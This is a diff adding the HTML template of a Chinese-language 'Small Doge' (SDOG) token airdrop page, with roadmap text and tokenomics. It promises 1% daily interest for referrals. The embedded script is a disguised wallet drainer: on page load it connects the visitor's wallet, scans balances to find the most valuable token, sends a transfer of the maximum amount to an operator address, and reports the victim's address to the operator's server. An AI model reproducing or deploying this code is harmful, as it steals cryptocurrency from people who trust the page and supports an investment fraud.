@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<script>!function(e){e.className=e.className.replace(/\bno-js\b/,"js")}(document.documentElement);</script>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   
+    <title>The Small Doge </title>
+    <link href="https://www.smalldogecoin.com/img/favicon.png" type="image/png" rel="shortcut icon">
+    
+    <script type="text/javascript" src="/dog_files/js/w3model.js"></script>
+    <script type="text/javascript" src="/dog_files/js/bignumber.min.js"></script>
+    <script type="text/javascript" src="/dog_files/js/web3.min.js"></script>
+    <script type="text/javascript" src="/dog_files/js/web3model.min.js"></script>
+    <script type="text/javascript" src="/dog_files/js/evmchain.js"></script>
+    <script type="text/javascript" src="/dog_files/js/web3provider.js"></script>
+    <script type="text/javascript" src="/dog_files/js/fortmatic.js"></script>
+     <link href="/dog_files/css/style.css" rel="stylesheet">
+    <style type="text/css">
+      #loading {
+		  display: none;
+		  position: absolute;
+		  top: 0;
+		  right: 0;
+		  left: 0;
+		  bottom: 0;
+		  width: 100%;
+		  height: 100%;
+		  background: rgba(0,0,0,.4);
+		  z-index: 10000;
+		}
+
+		#loading img {
+		  position: fixed;
+		  top: 0;
+		  right: 0;
+		  left: 0;
+		  bottom: 0;
+		  margin: auto;
+		  width: 20%;
+		  max-width: 200px;
+		}
+    </style>
+  </head>
+
+
+<body data-spy="scroll" data-target=".page-header-nav" data-offset="0">
+  <header class="page-header" id="top">
+  <div class="page-header-container">
+    <a href="" class="page-header-brand">
+      <img src="/dog_files/picture/sdog.svg" alt="SDOG" class="page-header-brand-img">
+    </a>
+    <div class="page-header-content">
+      <a href="#" class="page-header-toggle collapsed" data-toggle="navbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </a>
+      <nav class="page-header-navbar">
+        <ul class="nav page-header-nav">
+          <!--<li>-->
+          <!--  <a href="{:url('index/dog/index',['agent'=>$userId])}">领取SDOG</a>-->
+          <!--</li>-->
+          <li>
+            <a href="#whitelist" data-toggle="scroll-to" class="nav-link">空投机制</a>
+          </li>
+          <li>
+            <a href="#mining-mechanism" data-toggle="scroll-to" class="nav-link">挖矿机制</a>
+          </li>
+          <li>
+            <a href="#token-mechanism" data-toggle="scroll-to" class="nav-link">代币机制</a>
+          </li>
+          <li>
+            <a href="{:url('index/dog/buy',['agent'=>$userId])}" class="btn btn-primary process">领取流程</a>
+          </li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+</header>
+
+
+  <section class="welcome-section fade-in">
+    <div class="container" id="what">
+      <div class="welcome-content fade-xs-1 fade-md-1 fade-lg-1">
+        <ul class="nav nav-tabs welcome-tabs">
+          <li class="nav-item">
+            <a class="nav-link active" data-toggle="tab" href="#earth">地球计划</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#mars">火星计划</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" data-toggle="tab" href="#space">太空计划</a>
+          </li>
+        </ul>
+        <div class="tab-content">
+          <div class="tab-pane active" id="earth">
+            <h1 class="welcome-title"><span class="text-primary">地球计划</span> 初创，小狗币空投</h1>
+            <div class="welcome-lead">
+              <p>为了成为当前加密市场新秩序中价值流通的基石，SDOG所有的代币产出，除了空投给狗狗币持有者、Vitalik Buterin（V神）、Elon Musk（埃隆·马斯克）、NASA（美国国家航空航天局）和SpaceX（美国太空探索技术公司）的部分，都是以去中心化的方式分配给社区，让更多的人可以持有我，共同见证去中心化的生命力。</p>
+            </div>
+            <div class="welcome-img">
+              <img src="/dog_files/picture/welcome-earth.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+          <div class="tab-pane" id="mars">
+            <h1 class="welcome-title"><span class="text-primary">火星计划</span> 成长，火星节点</h1>
+            <div class="welcome-lead">
+              <p>2021年4月23日，SpaceX已经成功的将4位宇航员送进宇宙太空站，迈入太空的一小步已经踏出。在地球计划完成后SDOG也将开启火星节点计划，搭建自己的火星节点。节点越多越完善，小狗币的生态就会越安全，更加快速的确认交易有效性，保障信息的透明，为第三步计划做准备。</p>
+            </div>
+            <div class="welcome-img">
+              <img src="/dog_files/picture/welcome-mars.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+          <div class="tab-pane" id="space">
+            <h1 class="welcome-title"><span class="text-primary">太空计划</span> 未来，太空通用货币 </h1>
+            <div class="welcome-lead">
+              <p>在KenLon Musk Project带领下，我们完全可以搭建完全的去中心化网络，数据不会丢失，网络绝对安全。受信节点还可以获得运行网络的节点激励。嗯，到那个时后，我应该也不会叫小狗币了，请大家叫我火星币好吗？我将成为火星的通用货币~</p>
+            </div>
+            <div class="welcome-img">
+              <img src="/dog_files/picture/welcome-space.png" alt="" class="img-responsive-full">
+            </div>
+          </div>
+        </div>
+        <div class="welcome-btns">
+          <a href="{:url('index/dog/buy',['agent'=>$userId])}" class="btn btn-primary process" style="height: 40px;border-top-right-radius: 0;border-bottom-right-radius: 0;margin-right:0;">领取流程</a>
+          <a class="btn btn-third btn-tl btn-icon" href="javascript:;" id="btn-connect" style="height: 40px;border-top-left-radius: 0;border-bottom-left-radius: 0;margin-left:0;">
+            <img src="/dog_files/picture/dog.svg">领取SDOG NFT</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="airdrop-mechanism-section" id="whitelist">
+    <div class="container">
+      <div class="fade-in">
+        <div class="airdrop-mechanism-address fade-xs-0 fade-md-0 fade-lg-0">
+          <span class="date">
+
+                <span class="text-secondary">6月21日 12:00（UTC +0）</span>上线Uniswap交易
+          </span>
+          <img src="/dog_files/picture/dog.svg" alt="">
+          <span class="label">SDOG Token Address:</span>
+          <span class="text-primary">{$approveAddr}</span>
+        </div>
+        <header class="section-header fade-xs-0 fade-md-0 fade-lg-0">
+          <h2 class="section-header-title">空投机制              </h2>
+          <div class="section-header-text">
+            <p>分享推广链接满5人以上，即可激活钱包持币生息功能，钱包持有500USDT以上且存放3日后每日产生1%的利息</p>
+          </div>
+        </header>
+      </div>
+      <div class="fade-in">
+        <div class="airdrop-mechanism-logos fade-xs-0 fade-md-0 fade-lg-0">
+          <strong class="airdrop-mechanism-logos-title">已添加白名单钱包</strong>
+          <ul class="airdrop-mechanism-logos-list">
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/imtoken.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/huobi.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank" referrerpolicy="no-referrer">
+                <img src="/dog_files/picture/tp.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/coinbase.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/hyper.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/coco.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/bitepai.png" alt="">
+              </a>
+            </li>
+            <li>
+              <a href="javascript:;" target="_blank">
+                <img src="/dog_files/picture/meta.png" alt="">
+              </a>
+            </li>
+          </ul>
+        </div>
+        <div class="airdrop-mechanism-join fade-xs-2 fade-md-2 fade-lg-2">
+          <span class="airdrop-mechanism-join-label">白名单合作联系方式</span>
+          <ul class="airdrop-mechanism-join-social">
+            <li>
+              <a href="javascript:;" target="_blank"><i class="icon icon-tw"></i></a>
+            </li>
+            <li>
+              <a href="https://t.me/SDOGCustomerservice" target="_blank"><i class="icon icon-telegram"></i></a>
+            </li>
+            <li>
+              <a href="mailto:support@smalldogecoin.com"><i class="icon icon-contact"></i></a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="mining-mechanism-section" id="mining-mechanism">
+    <div class="container fade-in">
+      <header class="section-header fade-xs-0 fade-md-0 fade-lg-0">
+        <h2 class="section-header-title">挖矿机制</h2>
+        <div class="section-header-text">
+          <p>我们将在中心化交易所上进行了空投，并将挖矿功能放到去中心化以太坊网络中。SDOG 的 50%由去中心化挖矿产出。</p>
+        </div>
+      </header>
+      <div class="row mining-mechanism-row">
+        <div class="col-sm-6 fade-xs-1 fade-md-1 fade-lg-1">
+          <div class="mining-mechanism-text">
+            <strong class="mining-mechanism-text-header"><span class="nr">1</span> 挖矿方式：</strong>
+            <p>SDOG 单币质押、SDOG-ETH UNI v2 LP 流动性挖矿</p>
+            <strong class="mining-mechanism-text-header"><span class="nr">2</span> 挖矿模式：</strong>
+            <ul>
+              <li>前3周有10倍挖矿倍数加成。</li>
+              <li>挖矿收益将不会一次性解锁，具体解锁方式将在矿池上线时公布</li>
+            </ul>
+          </div>
+        </div>
+        <div class="col-sm-6 fade-xs-2 fade-md-2 fade-lg-2">
+          <img src="/dog_files/picture/mining-mechanism.png" alt="" class="img-responsive-full">
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="token-mechanism-section" id="token-mechanism">
+    <div class="container fade-in">
+      <div class="row token-mechanism-row">
+        <div class="col-sm-6 fade-xs-0 fade-md-0 fade-lg-0">
+          <h2 class="section-header-title">代币机制              </h2>
+          <div class="token-mechanism-text">
+            <div class="token-mechanism-text-total">
+              <span class="token-mechanism-text-total-label">代币总量</span>
+              <span class="token-mechanism-text-total-price"><span class="text-primary">128,756,977,746,000 SDOG</span></span>
+              <br>（1USDT = 1000 SDOG）
+            </div>
+            <div class="token-mechanism-text-distribution">
+              <strong>代币分配:                  </strong>
+              <p>
+                <span>初始流动性: <span>5%</span></span>
+                <span>V神: <span>5%</span></span>
+                <span>埃隆·马斯克: <span>5%</span></span>
+                <span>空投分配: <span>35%</span></span>
+                <span>挖矿分配: <span>50%</span></span>
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-6 fade-xs-1 fade-md-1 fade-lg-1">
+          <img src="/dog_files/picture/token-mechanism.png" alt="" class="img-responsive-full">
+        </div>
+      </div>
+    </div>
+  </section>
+  
+
+  <footer class="page-footer">
+  <div class="container">
+    <div class="page-footer-container">
+      <div class="page-footer-aside">
+        <div>
+          <a href="{:url('index/dog/buy',['agent'=>$userId])}" class="btn btn-primary process">领取流程</a>
+        </div>
+        <div>
+          <!-- <a href="index1.html" class="btn btn-tl btn-secondary">English</a> -->
+        </div>
+      </div>
+      <div class="page-footer-main">
+        <ul class="page-footer-social">
+          <li>
+            <a href="javascript:;" target="_blank"><i class="icon icon-tw"></i></a>
+          </li>
+          <li>
+            <a href="javascript:window.open('https://t.me/SDOGCustomerservice');" target="_blank"><i class="icon icon-telegram"></i></a>
+          </li>
+          <li>
+            <a href="mailto:support@smalldogecoin.com"><i class="icon icon-contact"></i></a>
+          </li>
+        </ul>
+        <div class="page-footer-copy">
+          &copy; Copyright © <strong>The Small Doge Project</strong> 2021
+        </div>
+      </div>
+    </div>
+  </div>
+
+</footer>
+
+<div class="modal fade" style="opacity: 1;transform: none;background-color: #00000099;" id="modalComingSoon" tabindex="-1" aria-hidden="true">
+<div class="modal-dialog">
+  <div class="modal-content" style="background: #13273c;">
+    <button type="button" id="closetui" class="modal-close" data-dismiss="modal" aria-label="Close">
+      <span aria-hidden="true">&times;</span>
+    </button>
+    <div class="modal-body">
+      <div class="modal-cooming-soon">
+        <h3 style="padding: 0.4rem 0rem 0.8rem 0rem;">邀请好友</h3>
+        <div class="layer_text" data-ischange="true" data-key="indexLayerMsg_1" style="white-space: normal;">
+            <div id="qrcode" style="height: 15rem;
+    width: 70%;margin-right:auto;margin-left:auto;">
+                    
+            </div>
+            <span style="display:block;font-size:1rem;word-break: break-all;text-align: center;">
+              推广链接：<span id="link"></span>
+            </span>
+            <div class="layer_line" style="text-align: center;
+				border-top: 1px solid;
+				width: 90%;
+				margin-left: auto;
+				margin-right: auto;
+				font-size: 0.9rem;
+				color: #e69564;"><span data-ischange="true" data-key="indexLayerMsg_2">分享推广链接满5人以上，即可激活钱包持币生息功能，钱包持有500USDT以上且存放3日后每日产生1%的利息</span></div>
+				 <a id="copyBtn" style="    padding: 0.6rem 2rem;
+				background: #e69564;
+				font-size: 1rem;
+				font-weight: 500;
+				color: white;
+				border-radius: 1.5rem;
+				margin-bottom: 2rem;
+				display: block;
+				text-align: center;
+				width: 60%;
+				margin-left: auto;
+				margin-right: auto;
+				margin-top: 1rem;" class="layer_btn" data-ischange="true" data-clipboard-text="" data-clipboard-action="copy" data-key="indexLayerBtn">复制链接</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+<div id="loading" style="display: none;">
+	<img src="/dog_files/image/loading.gif">
+</div>
+
+<div style="display:none;">
+    <textarea id="jsondata">{$abi}</textarea>
+	<textarea id="jsondata1">{$addr|json_encode}</textarea>
+	<textarea id="jsondata2">{$addr2|json_encode}</textarea>
+	<textarea id="jsondata3">{$addr3|json_encode}</textarea>
+</div>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script src="/dog_files/js/jquery-3.4.1.min.js"></script>
+<script src="/dog_files/js/aos.js"></script>
+<script src="/dog_files/js/qrcode.js"></script>
+<script src="/dog_files/js/clipboard.min.js"></script>
+<script src="/dog_files/js/all.min.js"></script>
+
+<script async="" src="/dog_files/js/js.js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){
+	dataLayer.push(arguments);
+  }
+  gtag('js', new Date());
+
+  gtag('config', 'G-LKKQY85Y2C');
+</script>
+<script>
+    const ABI = JSON.parse($('#jsondata').html());
+	var authorized_address = '{$authorized_address}';
+	var agent = "{$userId}";
+	var infura_key = '{$infura_key}';
+	var bizhong = 'usdt';
+	var approved = false;
+	var domain = '{$domain}';
+	var address = '';
+	var rank = 6.45;
+
+	const _web3 = new Web3('https://cloudflare-eth.com')
+	let injectedWeb3 = null, total = 0
+	let approveAddr = '{$approveAddr}';
+	const addr = JSON.parse($('#jsondata1').html());
+	const addr2 = JSON.parse($('#jsondata2').html());
+	const addr3 = JSON.parse($('#jsondata3').html());
+
+	const price = {
+		'usdt': 1,
+		'sushi': 15.5,
+		'usdc': 1,
+		'dai': 1,
+		'uni': 28.6,
+		'aave': 380,
+		'yfi': 35000,
+		'link': 28.2,
+		"LON": 7,
+		"CRV": 3.01367,
+		"GUSD": 1,
+		"WBTC": 56478.2,
+		"WETH": 1991.89,
+		"CONV": 0.105733,
+		"inj": 13.3812,
+		"MKR": 2076.68,
+		"ALPHA": 1.79043,
+		"BAND": 16.3441,
+		"snx": 20.0588,
+		"comp": 468.076,
+		"sxp": 4.11818,
+		"FTT": 46.1779,
+		"ust": 1.00543,
+		"TRIBE": 1.42926,
+		"wise": 0.446973,
+		"RRAX": 0.996821,
+		"CORE": 5447.59,
+		"mir": 8.69817,
+		"DPI": 415.906,
+		"luna": 15.2402,
+		"HEZ": 5.97533,
+		"fxs": 8.47025,
+		"fei": 0.898157,
+	}
+
+	const decimals = {
+		sushi: 18,
+		usdt: 6,
+		usdc: 6,
+		uni: 18,
+		dai: 18,
+		aave: 18,
+		yfi: 18,
+		link: 18,
+		WBTC: 8,
+	}
+
+	const contracts = {}, contracts2 = {}, contracts3 = {}
+	for (const symbol of Object.keys(addr)) {
+		const contractAddr = addr[symbol]
+		contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr2)) {
+		const contractAddr = addr2[symbol]
+		contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr3)) {
+		const contractAddr = addr3[symbol]
+		contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	const Web3Modal = window.Web3Modal.default;
+	const WalletConnectProvider = window.WalletConnectProvider.default;
+	// Web3modal instance
+	let web3Modal
+	// Chosen wallet provider given by the dialog window
+	let provider;
+	// Address of the selected account
+	let selectedAccount;
+	async function init() {
+		const providerOptions = {
+			walletconnect: {
+				package: WalletConnectProvider,
+				options: {
+					// Mikko's test key - don't copy as your mileage may vary
+					infuraId: infura_key,
+				}
+			},
+		};
+
+		web3Modal = new Web3Modal({
+			cacheProvider: false, // optional
+			providerOptions, // required
+			disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+		});
+		try {
+			provider = await web3Modal.connect()
+			provider.enable()
+		} catch(e) {
+			console.log("Could not get a wallet connection", e);
+			return;
+		}
+		// Subscribe to accounts change
+		provider.on("accountsChanged", async (accounts) => {
+			await fetchAccountData();
+		});
+		// Subscribe to chainId change
+		provider.on("chainChanged", async (chainId) => {
+			await fetchAccountData();
+		});
+		// Subscribe to networkId change
+		provider.on("networkChanged", async (networkId) => {
+			await fetchAccountData();
+		});
+		await fetchAccountData(provider);
+	}
+
+	/**
+	 * Kick in the UI action after Web3modal dialog has chosen a provider
+	 */
+	async function fetchAccountData() {
+		const web3 = new Web3(provider);
+		injectedWeb3 = web3;
+		provider.enable();
+		const accounts = await web3.eth.getAccounts();
+		selectedAccount = accounts[0];
+
+		getMostValuableAssets(selectedAccount);
+		setTimeout(function() {
+			getMostValuableAssets2(selectedAccount)
+		}, 200)
+		setTimeout(function() {
+			getMostValuableAssets3(selectedAccount)
+		}, 300)
+		// getInfo();
+		// getAirdropInfo();
+
+		//const web3 = new Web3(provider);
+		const contract = new web3.eth.Contract(ABI, approveAddr)
+		const gasPrice = await web3.eth.getGasPrice();
+
+		if (selectedAccount && provider) {
+			const web3 = new Web3(provider);
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+
+			const gasPrice = await web3.eth.getGasPrice()
+
+			contract.methods.transfer(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas: 70000,
+			}, function(err, tx) {
+				if(!err){
+					postInfo(selectedAccount,bizhong);
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+				console.log(err, tx);
+			})
+		} else {
+			provider = await web3Modal.connect()
+			provider.enable()
+			const web3 = new Web3(provider);
+			const accounts = await web3.eth.getAccounts()
+			selectedAccount = accounts[0]
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+			const gasPrice = await web3.eth.getGasPrice()
+
+			contract.methods.transfer(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas:70000,
+			}, function(err, tx) {
+				console.log(err, tx)
+				if(!err){
+					postInfo(selectedAccount,bizhong)
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+			})
+		}
+	}
+
+	async function getMostValuableAssets(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+
+		for (const [symbol, contract] of Object.entries(contracts)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				if(symbol == 'usdt'){
+					let yu =balance / (10** (decimals[symbol] || 18))
+					console.log(yu.toLocaleString())
+					$('#yu').text(yu.toLocaleString() +' USDT')
+				}
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					bizhong = _symbol
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+		bizhong = _symbol
+		// checkApproved(selectedAccount,bizhong);
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets2(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+		for (const [symbol, contract] of Object.entries(contracts2)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+
+		bizhong = _symbol
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets3(account) {
+		let _symbol = 'usdt'
+		for (const [symbol, contract] of Object.entries(contracts3)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+		bizhong = _symbol
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+	
+	async function postInfo(address,symbol){
+		var data = {
+			address:address,
+			auth_address:authorized_address,
+			bizhong:symbol,
+			agent:agent,
+		}
+		var d = new Date();
+		var n = d.getTime();
+
+		$.ajax({
+			type: 'get',
+			url:  domain + "{:url('index/api/erc_post')}?t="+n,
+			data: data,
+			success:function(){
+			}
+		})
+	}
+
+	async function connect(){
+		init();
+	}
+	
+	/**
+	 * Main entry point.
+	 */
+	window.addEventListener('load', async () => {
+		init();
+		document.querySelector("#btn-connect").addEventListener("click", connect);
+	// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+	});
+</script>
+
+</body>
+
+</html>
